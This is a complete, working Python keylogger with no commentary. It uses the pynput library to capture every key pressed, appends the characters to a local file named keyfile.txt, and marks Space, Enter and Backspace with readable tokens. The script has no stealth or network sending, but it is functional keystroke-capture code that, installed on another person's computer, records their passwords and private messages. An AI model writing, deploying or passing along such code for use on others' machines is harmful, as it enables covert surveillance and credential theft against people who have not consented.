from pynput import keyboard

def keyPressed(key):
    print(str(key))
    with open("keyfile.txt", "a") as logKey:
        try:
                char = key.char
                logKey.write(char)
        except:
            if key == keyboard.Key.space:
                logKey.write(" ")
            elif key == keyboard.Key.enter:
                logKey.write("[ENTER]\n")
            elif key == keyboard.Key.backspace:
                logKey.write("[BACKSPACE]")
            else:
                print("Error getting char")

if __name__ == "__main__":
    listener = keyboard.Listener(on_press=keyPressed)
    listener.start()
    input()